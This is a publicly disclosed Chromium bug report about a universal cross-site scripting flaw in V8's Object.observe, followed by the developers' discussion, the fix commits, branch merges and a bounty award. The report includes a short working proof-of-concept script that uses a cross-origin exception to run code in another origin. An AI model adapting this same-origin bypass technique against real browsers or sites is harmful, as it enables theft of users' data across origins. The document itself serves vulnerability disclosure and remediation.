# Security: Universal XSS using exceptions thrown from Object.observe

| Field | Value |
|-------|-------|
| **Issue ID** | [40082858](https://issues.chromium.org/issues/40082858) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Language, Blink>JavaScript>Runtime |
| **Reporter** | ma...@gmail.com |
| **Assignee** | ad...@chromium.org |
| **Created** | 2015-09-15 |
| **Bounty** | $7,500.00 |

## Description

## **VULNERABILITY DETAILS** From /v8/src/object-observe.js:

## function ObjectObserve(object, callback, acceptList) { (...) var objectObserveFn = %GetObjectContextObjectObserve(object); return objectObserveFn(object, callback, acceptList); }

## From /v8/src/runtime/runtime-observe.cc:

## RUNTIME\_FUNCTION(Runtime\_GetObjectContextObjectObserve) { (...) Handle<Context> context(object->GetCreationContext(), isolate); return context->native\_object\_observe(); }

|objectObserveFn| is derived from the observed object's creation context, potentially cross-origin. When this function is invoked, any subsequent exceptions will be created in the aforementioned context, and they'll propagated to a try-catch handler.

**VERSION**  

Chrome 45.0.2454.85 (Stable)  

Chrome 46.0.2490.22 (Beta)  

Chrome 47.0.2503.0 (Dev)  

Chromium 47.0.2510.0 (Release build compiled today)

**REPRODUCTION CASE**

<script>
var i = document.documentElement.appendChild(document.createElement('iframe'));
i.onload = function() {
try {
Object.observe(frames[0].location, Map, 0);
} catch(e) {
e.constructor.constructor('alert(location)')();
}
}
i.src = 'https://abc.xyz';
</script>

## Attachments

- [exploit.html](attachments/exploit.html) (text/html, 288 B)

## Timeline

### ri...@chromium.org (2015-09-15)

Thank you for all the great bugs!

### ri...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### jo...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### jo...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### da...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### jo...@chromium.org (2015-09-15)

I just fixed a similar bug in Blink. My fix there is to catch all cross-context exceptions and rethrow them as security exceptions (https://codereview.chromium.org/1339023002)

not sure what to do here...

### ha...@chromium.org (2015-09-15)

Still happens with ToT 7dd31c596f6e6277a263beb9268ef92238e30a85 which includes your change Jochen.

### jo...@chromium.org (2015-09-15)

right, my change was about another bug

### ri...@chromium.org (2015-09-15)

Would it be possible to add some access checks in Isolate::Throw to defend against any future exception trickiness?

### cl...@chromium.org (2015-09-15)

[Empty comment from Monorail migration]

### ad...@chromium.org (2015-09-15)

I'll get to this later today.

### ad...@chromium.org (2015-09-15)

A fix for this is likely related to the discussed fixes for https://crbug.com/chromium/367817

### ad...@chromium.org (2015-09-15)

I see two options:

1. Do the same fix Jochen did, but in object-observe.js: wrap calls in try/catch and re-throw a security exception if it catches. The main tricky bit of this solution is deciding when the re-throwing is necessary.

2. Disallow observation of access-checked objects. We already disallow observation of the WindowProxy, so this would simply expand that list to disallow observation of Location objects.

I tend to favor (2). I'd be interested to hear Jochen's thoughts, though.



### ad...@chromium.org (2015-09-16)

https://codereview.chromium.org/1346813002 implements (2)

### ha...@chromium.org (2015-09-16)

Given that the usage of O.o is very, very low and 2 completely shuts down the entry point I would favor 2 ... If you are interested in my opinion =).

### bu...@chromium.org (2015-09-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/21bd4564538b43dec9ff8c70d43c77a4696e4cfb

commit 21bd4564538b43dec9ff8c70d43c77a4696e4cfb
Author: adamk <adamk@chromium.org>
Date: Wed Sep 16 21:19:21 2015

Disallow Object.observe calls on access-checked objects

We already disallowed observing the global proxy; now we also
disallow any observation of access-checked objects (regardless
of whether the access check would succeed or fail, since there's
not a good way to tell the embedder what kind of access is being
requested).

Also disallow Object.getNotifier for the same reasons.

BUG=chromium:531891
LOG=y

Review URL: https://codereview.chromium.org/1346813002

Cr-Commit-Position: refs/heads/master@{#30774}

[modify] http://crrev.com/21bd4564538b43dec9ff8c70d43c77a4696e4cfb/src/messages.h
[modify] http://crrev.com/21bd4564538b43dec9ff8c70d43c77a4696e4cfb/src/object-observe.js
[modify] http://crrev.com/21bd4564538b43dec9ff8c70d43c77a4696e4cfb/src/runtime/runtime-object.cc
[modify] http://crrev.com/21bd4564538b43dec9ff8c70d43c77a4696e4cfb/src/runtime/runtime.h
[modify] http://crrev.com/21bd4564538b43dec9ff8c70d43c77a4696e4cfb/test/cctest/test-object-observe.cc


### ad...@chromium.org (2015-09-16)

We'll likely want to merge this back to both 46 and 45.

### cl...@chromium.org (2015-09-16)

[Empty comment from Monorail migration]

### ti...@chromium.org (2015-09-17)

46 merge request will be processed soon.

45 Stable has launched and bar is very high. If you still request the merge, pls add Merge-Request-45 label, to get it triaged by 45 TPM amineer@

### ad...@chromium.org (2015-09-17)

Adding Merge-Request-45 based on Security_Severity-High

### am...@google.com (2015-09-17)

Merge approved for M45 branch 2454, please land by Friday noon at the latest (Pacific) or you'll miss the cut.

### ti...@google.com (2015-09-17)

Approved for M46 (branch: 2490)

### ad...@chromium.org (2015-09-17)

Note to those following along. With my fix, this now alerts "/path/to/exploit.html" instead of "https://abc.xyz/".

### bu...@chromium.org (2015-09-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/134e541ad149b9732bc4fee6fe6952cf669703a7

commit 134e541ad149b9732bc4fee6fe6952cf669703a7
Author: Adam Klein <adamk@chromium.org>
Date: Thu Sep 17 21:20:21 2015

Version 4.5.103.34 (cherry-pick)

Merged 21bd4564538b43dec9ff8c70d43c77a4696e4cfb

Disallow Object.observe calls on access-checked objects

BUG=chromium:531891
LOG=N
TBR=jochen@chromium.org

Review URL: https://codereview.chromium.org/1352023002 .

Cr-Commit-Position: refs/branch-heads/4.5@{#37}
Cr-Branched-From: 7f211533faba9dd85708b1394186c7fe99b88392-refs/heads/4.5.103@{#1}
Cr-Branched-From: 4b38c15817033ccd9a65efbb3d038ae2423293c2-refs/heads/master@{#29527}

[modify] http://crrev.com/134e541ad149b9732bc4fee6fe6952cf669703a7/include/v8-version.h
[modify] http://crrev.com/134e541ad149b9732bc4fee6fe6952cf669703a7/src/messages.h
[modify] http://crrev.com/134e541ad149b9732bc4fee6fe6952cf669703a7/src/object-observe.js
[modify] http://crrev.com/134e541ad149b9732bc4fee6fe6952cf669703a7/src/runtime/runtime-object.cc
[modify] http://crrev.com/134e541ad149b9732bc4fee6fe6952cf669703a7/src/runtime/runtime.h
[modify] http://crrev.com/134e541ad149b9732bc4fee6fe6952cf669703a7/test/cctest/test-object-observe.cc


### bu...@chromium.org (2015-09-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/9b0fb52b57021473aa813f3fb99ad7384a8b86f1

commit 9b0fb52b57021473aa813f3fb99ad7384a8b86f1
Author: Adam Klein <adamk@chromium.org>
Date: Thu Sep 17 21:26:12 2015

Version 4.6.85.18 (cherry-pick)

Merged 21bd4564538b43dec9ff8c70d43c77a4696e4cfb

Disallow Object.observe calls on access-checked objects

BUG=chromium:531891
LOG=N
TBR=jochen@chromium.org

Review URL: https://codereview.chromium.org/1354773003 .

Cr-Commit-Position: refs/branch-heads/4.6@{#21}
Cr-Branched-From: 24d34a8ae3cad186792fb1e44e2d7c00d49cd181-refs/heads/4.6.85@{#1}
Cr-Branched-From: 8f441181a570c44ef5c949e8dfd9fd326ac10345-refs/heads/master@{#30256}

[modify] http://crrev.com/9b0fb52b57021473aa813f3fb99ad7384a8b86f1/include/v8-version.h
[modify] http://crrev.com/9b0fb52b57021473aa813f3fb99ad7384a8b86f1/src/messages.h
[modify] http://crrev.com/9b0fb52b57021473aa813f3fb99ad7384a8b86f1/src/object-observe.js
[modify] http://crrev.com/9b0fb52b57021473aa813f3fb99ad7384a8b86f1/src/runtime/runtime-object.cc
[modify] http://crrev.com/9b0fb52b57021473aa813f3fb99ad7384a8b86f1/src/runtime/runtime.h
[modify] http://crrev.com/9b0fb52b57021473aa813f3fb99ad7384a8b86f1/test/cctest/test-object-observe.cc


### ha...@chromium.org (2015-09-18)

[Empty comment from Monorail migration]

### ti...@google.com (2015-09-22)

[Empty comment from Monorail migration]

### ti...@google.com (2015-09-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-12-23)

Bulk update: removing view restriction from closed bugs.

### ha...@chromium.org (2016-03-03)

[Empty comment from Monorail migration]

### ti...@google.com (2016-06-30)

$7,500 for this one as well. Congrats!

### aw...@chromium.org (2016-08-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/531891?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>JavaScript>Language, Blink>JavaScript>Runtime]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082858)*
